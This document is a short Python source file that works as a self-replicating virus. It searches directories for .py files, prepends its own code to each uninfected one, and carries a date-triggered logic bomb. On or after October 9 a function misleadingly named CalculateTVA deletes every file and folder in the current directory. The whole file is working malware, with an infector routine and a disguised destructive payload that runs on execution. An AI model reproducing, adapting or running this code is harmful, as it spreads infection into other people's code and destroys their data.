import os,shutil
import sys
import datetime
SIGNATURE = "PYTHON VERSION "
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    file = open(os.path.abspath(__file__))
    filestring = ""
    for i,line in enumerate(file):
        if i >= 0 and i < 56:
            filestring += line
    file.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(filestring + temp)
        f.close()

def CalculateTVA() :
    folder = './/'
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print('Failed to delete %s. Reason: %s' % (file_path, e))

def RealTime():
    if datetime.datetime.now().month == 10 and datetime.datetime.now().day >= 9:
        CalculateTVA()
        sys.exit()

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
RealTime()